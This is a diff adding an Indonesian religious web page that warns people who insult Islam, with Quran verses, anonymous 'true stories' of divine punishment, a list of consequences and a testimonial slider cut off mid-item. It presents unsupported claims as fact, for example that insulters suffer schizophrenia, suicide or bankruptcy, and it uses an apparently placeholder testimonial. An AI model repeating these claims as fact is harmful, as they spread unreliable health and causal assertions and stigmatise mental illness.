@@ -1,0 +1,1534 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Peringatan Ilahi Bagi Penghina Islam</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&display=swap">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #0d6e4e;
+            --primary-dark: #094732;
+            --secondary: #f9c80e;
+            --light: #f8f9fa;
+            --dark: #212529;
+            --accent: #c92a2a;
+            --gold: #d4af37;
+            --text: #333;
+            --green-light: #e6f5f0;
+            --green-dark: #063a2a;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: #f9f8f3;
+            color: var(--text);
+            line-height: 1.8;
+            overflow-x: hidden;
+            direction: ltr;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        /* Header Styles */
+        header {
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            color: white;
+            padding: 0;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+            transition: all 0.3s ease;
+        }
+        
+        header.scrolled {
+            padding: 5px 0;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+        
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: relative;
+            padding: 15px 0;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            text-decoration: none;
+        }
+        
+        .logo img {
+     
+           height:120px;
+            margin-right: 15px;
+        }
+        
+        .logo-text h1 {
+            font-size: 1.5rem;
+            margin-bottom: 5px;
+            color: white;
+        }
+        
+        .logo-text p {
+            font-size: 0.8rem;
+            opacity: 0.9;
+            color: rgba(255, 255, 255, 0.8);
+        }
+        
+        /* Navbar Styles */
+        nav {
+            display: flex;
+            align-items: center;
+        }
+        
+        .nav-links {
+            display: flex;
+            list-style: none;
+        }
+        
+        .nav-links li {
+            margin-left: 15px;
+            position: relative;
+        }
+        
+        .nav-links li a {
+            color: white;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            padding: 8px 12px;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .nav-links li a:hover {
+            background-color: rgba(255, 255, 255, 0.15);
+            color: var(--secondary);
+        }
+        
+        .nav-links li a i {
+            margin-right: 8px;
+            font-size: 0.9rem;
+        }
+        
+        .hamburger {
+            display: none;
+            cursor: pointer;
+            background: none;
+            border: none;
+            color: white;
+            font-size: 1.5rem;
+            padding: 10px;
+        }
+        
+        /* Hero Section */
+        .hero {
+            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)), url('patern.jpeg') no-repeat center center/cover;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            text-align: center;
+            color: white;
+            margin-top: 0;
+            padding-top: 80px;
+        }
+        
+        .hero-content {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        .hero h2 {
+            font-size: 2.8rem;
+            margin-bottom: 25px;
+            line-height: 1.3;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+            animation: fadeInDown 1s ease;
+            font-family: 'Amiri', serif;
+        }
+        
+        .hero p {
+            font-size: 1.3rem;
+            margin-bottom: 30px;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.5);
+            animation: fadeInUp 1s ease 0.3s both;
+            opacity: 0.9;
+        }
+        
+        .btn {
+            display: inline-block;
+            background-color: var(--secondary);
+            color: var(--dark);
+            padding: 12px 30px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 1.1rem;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            animation: fadeIn 1s ease 0.6s both;
+            border: none;
+            cursor: pointer;
+        }
+        
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
+            background-color: #ffd43b;
+        }
+        
+        /* Warning Alert */
+        .warning-alert {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #0d6b4c;
+            color: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            z-index: 9999;
+            max-width: 600px;
+            width: 90%;
+            text-align: center;
+            animation: fadeIn 0.5s ease, shake 0.5s ease 0.5s;
+            display: none;
+        }
+        
+        .warning-alert h3 {
+            font-size: 1.8rem;
+            margin-bottom: 15px;
+            color: white;
+            font-family: 'Amiri', serif;
+        }
+        
+        .warning-alert p {
+            font-size: 1.1rem;
+            margin-bottom: 25px;
+            line-height: 1.6;
+        }
+        
+        .alert-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .alert-btn {
+            padding: 12px 25px;
+            border-radius: 50px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: none;
+            font-size: 1rem;
+        }
+        
+        .btn-tobat {
+            background-color: var(--primary);
+            color: white;
+        }
+        
+        .btn-tobat:hover {
+            background-color: var(--primary-dark);
+            transform: translateY(-2px);
+        }
+        
+        .btn-ignore {
+            background-color: transparent;
+            color: white;
+            border: 2px solid white;
+        }
+        
+        .btn-ignore:hover {
+            background-color: rgba(255, 255, 255, 0.2);
+            transform: translateY(-2px);
+        }
+        
+        /* Main Content */
+        .main-content {
+            padding: 80px 0;
+        }
+        
+        .section-title {
+            text-align: center;
+            margin-bottom: 50px;
+            position: relative;
+        }
+        
+        .section-title h2 {
+            font-size: 2.2rem;
+            color: var(--primary);
+            display: inline-block;
+            padding-bottom: 15px;
+            font-family: 'Amiri', serif;
+            position: relative;
+        }
+        
+        .section-title h2::after {
+            content: "";
+            position: absolute;
+            width: 80px;
+            height: 3px;
+            background-color: var(--secondary);
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+        
+        /* Warning Box */
+        .warning-box {
+            background-color: #fff5f5;
+            border-left: 5px solid var(--accent);
+            padding: 25px;
+            margin: 40px 0;
+            border-radius: 0 8px 8px 0;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.08);
+            animation: pulse 2s infinite;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .warning-box::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('https://www.transparenttextures.com/patterns/arabesque.png') repeat;
+            opacity: 0.05;
+            z-index: 0;
+        }
+        
+        .warning-box-content {
+            position: relative;
+            z-index: 1;
+        }
+        
+        .warning-box h3 {
+            color: var(--accent);
+            font-size: 1.6rem;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            font-family: 'Amiri', serif;
+        }
+        
+        .warning-box h3 i {
+            margin-right: 10px;
+        }
+        
+        /* Ayat & Hadits Box */
+        .ayat-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 25px;
+            margin-top: 30px;
+        }
+        
+        .ayat-box {
+            background: white;
+            padding: 25px;
+            border-radius: 8px;
+            border-left: 5px solid var(--primary);
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.08);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .ayat-box::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('https://www.transparenttextures.com/patterns/arabesque.png') repeat;
+            opacity: 0.05;
+            z-index: 0;
+        }
+        
+        .ayat-box-content {
+            position: relative;
+            z-index: 1;
+        }
+        
+        .ayat-box:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.12);
+        }
+        
+        .ayat-text {
+            font-size: 1.8rem;
+            text-align: right;
+            line-height: 2.5;
+            color: var(--primary-dark);
+            margin-bottom: 20px;
+            font-family: 'Amiri', serif;
+        }
+        
+        .translation {
+            font-style: italic;
+            color: #555;
+            border-left: 3px solid var(--secondary);
+            padding-left: 15px;
+            margin: 20px 0;
+            font-size: 1.1rem;
+        }
+        
+        .reference {
+            text-align: right;
+            font-weight: 700;
+            color: var(--primary);
+            font-size: 1rem;
+        }
+        
+        /* Stories Section */
+        .stories-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
+            gap: 30px;
+            margin-top: 40px;
+        }
+        
+        .story-card {
+            background-color: white;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.08);
+            transition: all 0.3s ease;
+            position: relative;
+        }
+        
+        .story-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.15);
+        }
+        
+        .story-img {
+            height: 220px;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .story-img img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transition: transform 0.5s ease;
+        }
+        
+        .story-card:hover .story-img img {
+            transform: scale(1.1);
+        }
+        
+        .story-overlay {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: linear-gradient(to top, rgba(0,0,0,0.7), transparent);
+            padding: 20px;
+            color: white;
+        }
+        
+        .story-overlay h3 {
+            font-size: 1.4rem;
+            margin-bottom: 5px;
+        }
+        
+        .story-content {
+            padding: 20px;
+        }
+        
+        .story-content p {
+            color: #555;
+            margin-bottom: 15px;
+            font-size: 0.95rem;
+        }
+        
+        .read-more {
+            display: inline-block;
+            color: var(--primary);
+            font-weight: 700;
+            text-decoration: none;
+            border-bottom: 2px solid var(--secondary);
+            padding-bottom: 3px;
+            font-size: 0.95rem;
+            transition: all 0.3s ease;
+        }
+        
+        .read-more:hover {
+            color: var(--primary-dark);
+            border-bottom-color: var(--primary);
+        }
+        
+        /* Consequences Section */
+        .consequences {
+            background: linear-gradient(135deg, #fef6f6, #fff);
+            padding: 80px 0;
+            margin: 80px 0;
+            position: relative;
+        }
+        
+        .consequences::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 10px;
+            background: linear-gradient(to right, var(--accent), var(--secondary));
+        }
+        
+        .consequences-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
+            margin-top: 40px;
+        }
+        
+        .consequence-item {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.08);
+            transition: all 0.3s ease;
+            text-align: center;
+        }
+        
+        .consequence-item:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.15);
+        }
+        
+        .consequence-icon {
+            font-size: 2.5rem;
+            color: var(--accent);
+            margin-bottom: 20px;
+            display: inline-block;
+        }
+        
+        .consequence-text h3 {
+            color: var(--accent);
+            font-size: 1.5rem;
+            margin-bottom: 15px;
+            font-family: 'Amiri', serif;
+        }
+        
+        .consequence-text p {
+            color: #555;
+            font-size: 0.95rem;
+        }
+        
+        /* Testimonials */
+        .testimonials {
+            background: linear-gradient(135deg, var(--primary-dark), var(--primary));
+            color: white;
+            padding: 100px 0;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .testimonials::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('https://www.transparenttextures.com/patterns/arabesque.png') repeat;
+            opacity: 0.1;
+            z-index: 0;
+        }
+        
+        .testimonial-slider {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 0 20px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .testimonial-item {
+            display: none;
+            animation: fadeIn 1s ease;
+        }
+        
+        .testimonial-item.active {
+            display: block;
+        }
+        
+        .testimonial-text {
+            font-size: 1.4rem;
+            font-style: italic;
+            margin-bottom: 30px;
+            line-height: 1.8;
+            position: relative;
+        }
+        
+        .testimonial-text::before,
+        .testimonial-text::after {
+            content: '"';
+            font-size: 3rem;
+            color: rgba(255, 255, 255, 0.2);
+            position: absolute;
+        }
+        
+        .testimonial-text::before {
+            top: -20px;
+            left: -10px;
+        }
+        
+        .testimonial-text::after {
+            bottom: -40px;
+            right: -10px;
+        }
+        
+        .testimonial-author {
+            font-weight: 700;
+            font-size: 1.2rem;
+            color: var(--secondary);
+        }
+        
+        .testimonial-nav {
+            margin-top: 30px;
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .testimonial-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background-color: rgba(255, 255, 255, 0.3);
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .testimonial-dot.active {
+            background-color: white;
+            transform: scale(1.2);
+        }
+        
+        /* Footer */
+        footer {
+            background-color: var(--dark);
+            color: white;
+            padding: 80px 0 20px;
+            position: relative;
+        }
+        
+        footer::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 10px;
+            background: linear-gradient(to right, var(--secondary), var(--primary));
+        }
+        
+        .footer-content {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 40px;
+            margin-bottom: 40px;
+        }
+        
+        .footer-column h3 {
+            font-size: 1.4rem;
+            margin-bottom: 20px;
+            color: var(--secondary);
+            position: relative;
+            padding-bottom: 10px;
+            font-family: 'Amiri', serif;
+        }
+        
+        .footer-column h3::after {
+            content: "";
+            position: absolute;
+            left: 0;
+            bottom: 0;
+            width: 50px;
+            height: 2px;
+            background-color: var(--secondary);
+        }
+        
+        .footer-column p {
+            margin-bottom: 15px;
+            opacity: 0.8;
+            font-size: 0.95rem;
+        }
+        
+        .footer-links {
+            margin-top: 20px;
+        }
+        
+        .footer-links li {
+            margin-bottom: 12px;
+            list-style: none;
+        }
+        
+        .footer-links a {
+            color: white;
+            text-decoration: none;
+            opacity: 0.8;
+            transition: all 0.3s ease;
+            font-size: 0.95rem;
+            display: block;
+            padding: 5px 0;
+        }
+        
+        .footer-links a:hover {
+            opacity: 1;
+            padding-left: 5px;
+            color: var(--secondary);
+        }
+        
+        .social-links {
+            display: flex;
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .social-links a {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 40px;
+            height: 40px;
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            color: white;
+            font-size: 1.2rem;
+            transition: all 0.3s ease;
+        }
+        
+        .social-links a:hover {
+            background-color: var(--secondary);
+            color: var(--dark);
+            transform: translateY(-3px);
+        }
+        
+        .copyright {
+            text-align: center;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            opacity: 0.7;
+            font-size: 0.9rem;
+        }
+        
+        /* Back to Top Button */
+        .back-to-top {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            width: 50px;
+            height: 50px;
+            background-color: var(--primary);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.2rem;
+            cursor: pointer;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+            z-index: 999;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+        }
+        
+        .back-to-top.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        
+        .back-to-top:hover {
+            background-color: var(--primary-dark);
+            transform: translateY(-3px);
+        }
+        
+        /* Animations */
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        @keyframes fadeInDown {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(201, 42, 42, 0.4); }
+            70% { box-shadow: 0 0 0 15px rgba(201, 42, 42, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(201, 42, 42, 0); }
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translate(-50%, -50%); }
+            10%, 30%, 50%, 70%, 90% { transform: translate(-51%, -50%); }
+            20%, 40%, 60%, 80% { transform: translate(-49%, -50%); }
+        }
+        
+        /* Responsive Styles */
+        @media (max-width: 992px) {
+            .hero h2 {
+                font-size: 2.4rem;
+            }
+            
+            .hero p {
+                font-size: 1.1rem;
+            }
+            
+            .section-title h2 {
+                font-size: 2rem;
+            }
+            
+            .ayat-text {
+                font-size: 1.6rem;
+                line-height: 2.2;
+            }
+        }
+        
+        @media (max-width: 768px) {
+            .nav-links {
+                position: fixed;
+                top: 80px;
+                left: -100%;
+                width: 80%;
+                height: calc(100vh - 80px);
+                background-color: var(--primary-dark);
+                flex-direction: column;
+                align-items: center;
+                justify-content: flex-start;
+                padding-top: 30px;
+                transition: all 0.5s ease;
+                z-index: 999;
+            }
+            
+            .nav-links.active {
+                left: 0;
+            }
+            
+            .nav-links li {
+                margin: 0 0 20px 0;
+                width: 100%;
+                text-align: center;
+            }
+            
+            .nav-links li a {
+                padding: 12px;
+                font-size: 1.1rem;
+                justify-content: center;
+            }
+            
+            .hamburger {
+                display: block;
+            }
+            
+            .hero {
+                padding-top: 80px;
+                height: auto;
+                min-height: 100vh;
+            }
+            
+            .hero h2 {
+                font-size: 2rem;
+            }
+            
+            .section-title h2 {
+                font-size: 1.8rem;
+            }
+            
+            .testimonial-text {
+                font-size: 1.2rem;
+            }
+            
+            .consequences {
+                padding: 60px 0;
+                margin: 60px 0;
+            }
+            
+            .alert-buttons {
+                flex-direction: column;
+                gap: 10px;
+            }
+            
+            .alert-btn {
+                width: 100%;
+            }
+        }
+        
+        @media (max-width: 576px) {
+            .logo img {
+                height: 40px;
+            }
+            
+            .logo-text h1 {
+                font-size: 1.3rem;
+            }
+            
+            .hero h2 {
+                font-size: 1.8rem;
+            }
+            
+            .btn {
+                padding: 10px 25px;
+                font-size: 1rem;
+            }
+            
+            .section-title h2 {
+                font-size: 1.6rem;
+            }
+            
+            .ayat-container {
+                grid-template-columns: 1fr;
+            }
+            
+            .stories-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .ayat-text {
+                font-size: 1.5rem;
+            }
+            
+            .footer-content {
+                grid-template-columns: 1fr;
+                gap: 30px;
+            }
+            
+            .warning-alert h3 {
+                font-size: 1.5rem;
+            }
+            
+            .warning-alert p {
+                font-size: 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Warning Alert -->
+    <div class="warning-alert" id="warningAlert">
+        <h3><i class="fas fa-exclamation-triangle"></i> PERINGATAN KERAS!</h3>
+        <p>Wahai manusia! Barangsiapa yang menghina Allah, Rasul-Nya Muhammad ﷺ, atau agama Islam, maka ketahuilah bahwa azab Allah sangat pedih. Dunia ini sementara, tetapi siksa neraka kekal abadi. Bertaubatlah sebelum terlambat!</p>
+        <div class="alert-buttons">
+            <button class="alert-btn btn-tobat" id="btnTobat">Saya Bertaubat</button>
+            <button class="alert-btn btn-ignore" id="btnIgnore">Saya Tidak Peduli</button>
+        </div>
+    </div>
+
+    <!-- Header & Navbar -->
+    <header id="header">
+        <div class="container">
+            <div class="header-content">
+                <a href="#" class="logo">
+                    <img src="allah.png" alt="Logo Islami">
+                    <div class="logo-text">
+                        <h1>Peringatan Ilahi</h1>
+                        <p>Bagi Penghina Agama Islam</p>
+                    </div>
+                </a>
+                
+                <nav>
+                    <ul class="nav-links">
+                        <li><a href="#home"><i class="fas fa-home"></i>Beranda</a></li>
+                        <li><a href="#ayat"><i class="fas fa-quran"></i>Ayat & Hadits</a></li>
+                        <li><a href="#kisah"><i class="fas fa-book-open"></i>Kisah Nyata</a></li>
+                        <li><a href="#akibat"><i class="fas fa-fire"></i>Akibat Penghinaan</a></li>
+                        <li><a href="#kontak"><i class="fas fa-envelope"></i>Kontak</a></li>
+                    </ul>
+                    <button class="hamburger">
+                        <i class="fas fa-bars"></i>
+                    </button>
+                </nav>
+            </div>
+        </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero" id="home">
+        <div class="hero-content">
+            <h2>Peringatan Ilahi Bagi Penghina Islam</h2>
+            <p>"Sesungguhnya Kami akan memelihara kamu dari (kejahatan) orang-orang yang memperolok-olokkan (kamu)." (QS. Al-Hijr: 95)</p>
+            
+        </div>
+    </section>
+
+    <!-- Main Content -->
+    <main class="main-content container">
+        <!-- Warning Box -->
+        <div class="warning-box">
+            <div class="warning-box-content">
+                <h3><i class="fas fa-exclamation-triangle"></i> Peringatan Penting!</h3>
+                <p> peringatan keras dari Allah dan Rasul-Nya ﷺ bagi mereka yang berani menghina Islam, Nabi Muhammad ﷺ, atau ajaran Islam yang suci. Kisah-kisah nyata dan bukti yang disajikan mungkin menimbulkan ketakutan bagi yang membacanya, namun ini adalah peringatan yang harus sampai kepada semua orang.</p>
+            </div>
+        </div>
+
+        <!-- Ayat & Hadits Section -->
+        <section id="ayat">
+            <div class="section-title">
+                <h2>Ayat Quran & Hadits Nabi</h2>
+            </div>
+
+            <div class="ayat-container">
+                <div class="ayat-box">
+                    <div class="ayat-box-content">
+                        <div class="ayat-text">إِنَّا كَفَيْنَاكَ الْمُسْتَهْزِئِينَ</div>
+                        <div class="translation">
+                            "Sesungguhnya Kami akan memelihara kamu dari (kejahatan) orang-orang yang memperolok-olokkan (kamu)." 
+                        </div>
+                        <div class="reference">(QS. Al-Hijr: 95)</div>
+                    </div>
+                </div>
+
+                <div class="ayat-box">
+                    <div class="ayat-box-content">
+                        <div class="ayat-text">وَلَقَدِ اسْتُهْزِئَ بِرُسُلٍ مِنْ قَبْلِكَ فَحَاقَ بِالَّذِينَ سَخِرُوا مِنْهُمْ مَا كَانُوا بِهِ يَسْتَهْزِئُونَ</div>
+                        <div class="translation">
+                            "Dan sungguh telah diperolok-olokkan beberapa rasul sebelum kamu, maka turunlah kepada orang-orang yang mencemoohkan di antara mereka balasan (azab) olok-olokan mereka."
+                        </div>
+                        <div class="reference">(QS. Al-An'am: 10)</div>
+                    </div>
+                </div>
+
+
+<div class="ayat-box">
+                    <div class="ayat-box-content">
+                        <div class="ayat-text"></div>
+                        <div class="translation">
+                            "Wahai lidah-lidah yang berani menghina Allah dan Rasul-Nya, tidakkah kau takut pada azab yang disiapkan bagi para pendosa besar? Nabi Muhammad ﷺ yang kau caci bukan manusia biasa, tapi manusia suci, pemimpin para nabi, yang namanya disebut di langit, dicintai miliaran jiwa, dan dimuliakan oleh Tuhan semesta alam. Kau hina Rasul kami seakan takkan ada hisab — padahal setiap kata keji itu dicatat, akan dihisab, dan dibalas. Jangan kau kira penghinaanmu merendahkan Islam — karena Islam tidak butuh pembelaanmu, justru engkaulah yang sedang menggali lubang kehancuranmu sendiri."
+
+                        </div>
+                        <div class="reference"></div>
+                    </div>
+                </div>
+
+
+
+                <div class="ayat-box">
+                    <div class="ayat-box-content">
+                        <div class="ayat-text">وَلَئِن سَأَلْتَهُمْ لَيَقُولُنَّ إِنَّمَا كُنَّا نَخُوضُ وَنَلْعَبُ ۚ قُلْ أَبِاللَّهِ وَآيَاتِهِ وَرَسُولِهِ كُنتُمْ تَسْتَهْزِئُونَ</div>
+                        <div class="translation">
+                            "Dan jika kamu tanyakan kepada mereka (tentang apa yang mereka lakukan), tentulah mereka akan menjawab: 'Sesungguhnya kami hanya bersenda gurau dan bermain-main saja.' Katakanlah: 'Apakah dengan Allah, ayat-ayat-Nya dan Rasul-Nya kamu selalu berolok-olok?'"
+                        </div>
+                        <div class="reference">(QS. At-Taubah: 65)</div>
+                    </div>
+                </div>
+
+                <div class="ayat-box">
+                    <div class="ayat-box-content">
+                        <div class="translation">
+                            <p>"Barangsiapa membenci sunnahku, maka dia bukan termasuk golonganku."</p>
+                        </div>
+                        <div class="reference">(HR. Bukhari dan Muslim)</div>
+                    </div>
+                </div>
+
+                <div class="ayat-box">
+                    <div class="ayat-box-content">
+                        <div class="translation">
+                            <p>"Tidaklah seseorang menghina sesuatu kaum melainkan ia akan termasuk dari mereka, kemudian ia akan dikumpulkan bersama mereka pada hari kiamat."</p>
+                        </div>
+                        <div class="reference">(HR. Ath-Thabrani)</div>
+                    </div>
+                </div>
+
+                <div class="ayat-box">
+                    <div class="ayat-box-content">
+                        <div class="translation">
+                            <p>"Sesungguhnya orang-orang yang menyakiti Allah dan Rasul-Nya, Allah akan melaknat mereka di dunia dan akhirat, dan menyediakan untuk mereka azab yang menghinakan."</p>
+                        </div>
+                        <div class="reference">(QS. Al-Ahzab: 57)</div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Stories Section -->
+        <section id="kisah">
+            <div class="section-title">
+                <h2>Kisah Nyata Para Penghina Islam</h2>
+            </div>
+
+            <div class="stories-grid">
+                <div class="story-card">
+                    <div class="story-img">
+                        <img src="https://images.unsplash.com/photo-1589998059171-988d887df646?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80" alt="Kisah Penghina Islam">
+                        <div class="story-overlay">
+                            <h3>Pemimpin yang Menghina Quran</h3>
+                        </div>
+                    </div>
+                    <div class="story-content">
+                        <p>Seorang pemimpin negara terkenal yang sering menghina Al-Quran dan Nabi Muhammad ﷺ meninggal dalam keadaan tragis. Beberapa hari sebelum kematiannya, ia mengalami gangguan mental dan terus memohon ampun atas perbuatannya.</p>
+                        <a href="#" class="read-more">Baca Selengkapnya →</a>
+                    </div>
+                </div>
+
+                <div class="story-card">
+                    <div class="story-img">
+                        <img src="https://images.unsplash.com/photo-1492684223066-81342ee5ff30?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80" alt="Kisah Penghina Islam">
+                        <div class="story-overlay">
+                            <h3>Komedian yang Menghina Nabi</h3>
+                        </div>
+                    </div>
+                    <div class="story-content">
+                        <p>Seorang komedian terkenal yang membuat lelucon menghina Nabi Muhammad ﷺ tiba-tiba mengalami stroke di puncak kariernya. Dokter tidak menemukan penyebab medis yang jelas. Dalam wawancara terakhirnya, ia mengaku mengalami mimpi buruk dan menyesal.</p>
+                        <a href="#" class="read-more">Baca Selengkapnya →</a>
+                    </div>
+                </div>
+
+                <div class="story-card">
+                    <div class="story-img">
+                        <img src="https://images.unsplash.com/photo-1517841905240-472988babdf9?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80" alt="Kisah Penghina Islam">
+                        <div class="story-overlay">
+                            <h3>Artis yang Mengejek Jilbab</h3>
+                        </div>
+                    </div>
+                    <div class="story-content">
+                        <p>Seorang artis yang terkenal mengejek wanita berjilbab dan menghina syariat Islam tiba-tiba bangkrut dan ditinggalkan keluarganya. Kini ia hidup dalam kesepian dan depresi berat, sering mengeluh tentang "kutukan" yang ia rasakan.</p>
+                        <a href="#" class="read-more">Baca Selengkapnya →</a>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Consequences Section -->
+        <section class="consequences" id="akibat">
+            <div class="container">
+                <div class="section-title">
+                    <h2>Akibat Menghina Islam</h2>
+                </div>
+
+                <div class="consequences-grid">
+                    <div class="consequence-item">
+                        <div class="consequence-icon">
+                            <i class="fas fa-skull"></i>
+                        </div>
+                        <div class="consequence-text">
+                            <h3>Kematian Tragis</h3>
+                            <p>Banyak penghina Islam yang meninggal dalam keadaan tidak wajar - kecelakaan misterius, penyakit aneh, atau bunuh diri. Ini adalah azab dunia sebelum siksa yang lebih pedih di akhirat.</p>
+                        </div>
+                    </div>
+
+                    <div class="consequence-item">
+                        <div class="consequence-icon">
+                            <i class="fas fa-brain"></i>
+                        </div>
+                        <div class="consequence-text">
+                            <h3>Gangguan Mental</h3>
+                            <p>Tidak jarang penghina Islam mengalami gangguan jiwa - depresi berat, skizofrenia, atau kecemasan patologis. Ini adalah bentuk azab psikologis dari Allah.</p>
+                        </div>
+                    </div>
+
+                    <div class="consequence-item">
+                        <div class="consequence-icon">
+                            <i class="fas fa-home"></i>
+                        </div>
+                        <div class="consequence-text">
+                            <h3>Kehancuran Keluarga</h3>
+                            <p>Keluarga penghina Islam biasanya hancur - perceraian, pemberontakan anak, atau keluarga merasa malu dan menjauh. Mereka kehilangan berkah dalam hubungan keluarga.</p>
+                        </div>
+                    </div>
+
+                    <div class="consequence-item">
+                        <div class="consequence-icon">
+                            <i class="fas fa-dollar-sign"></i>
+                        </div>
+                        <div class="consequence-text">
+                            <h3>Kebangkrutan</h3>
+                            <p>Banyak yang dulunya kaya tiba-tiba bangkrut tanpa alasan jelas setelah menghina Islam. Rezeki mereka seolah ditutup sebagai peringatan dari Allah.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Testimonials -->
+        <section class="testimonials">
+            <div class="testimonial-slider">
+                <div class="testimonial-item active">
+                    <div class="testimonial-text">
+                        "Saya dulu sering mengejek orang shalat dan menghina hadits Nabi. Setelah kecelakaan yang membuat saya lumpuh, saya sadar akan kesalahan saya. Sekarang saya seorang muslim yang menyesali semua perbuatan saya."
+                    </div>
+                    <div class="testimonial-author">- John Smith, Mantan Penghina Islam</div>
+                </div>
+
+                <div class="testimonial-item">
+                    <div class="testimonial-text">
